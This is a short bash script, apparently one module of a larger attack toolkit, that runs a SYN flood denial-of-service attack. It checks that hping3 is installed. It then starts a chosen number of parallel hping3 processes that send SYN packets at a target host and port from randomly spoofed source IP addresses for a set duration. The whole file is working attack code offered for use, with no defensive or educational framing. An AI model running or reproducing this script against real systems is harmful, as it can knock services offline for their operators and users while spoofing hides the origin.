#!/bin/bash

# SYN Flood Attack Module
source core/banner.sh

syn_flood() {
    local target=$1
    local port=$2
    local duration=$3
    local threads=$4
    
    echo -e "${CYAN}[SYN FLOOD]${NC} Starting SYN flood attack..."
    echo -e "${YELLOW}Target: $target:$port${NC}"
    echo -e "${YELLOW}Duration: $duration seconds${NC}"
    echo -e "${YELLOW}Threads: $threads${NC}"
    
    # Check if hping3 is available
    if ! command -v hping3 &> /dev/null; then
        echo -e "${RED}Error: hping3 not found. Please install hping3.${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}Launching SYN flood with spoofed IPs...${NC}"
    
    for ((i=1; i<=threads; i++)); do
        {
            # Generate random source IP
            local src_ip="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
            timeout $duration hping3 -S -p $port -a $src_ip -i u100 $target > /dev/null 2>&1
        } &
    done
    
    wait
    
    echo -e "${GREEN}SYN flood attack completed.${NC}"
}

# If script is called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    syn_flood "$1" "$2" "$3" "$4"
fi

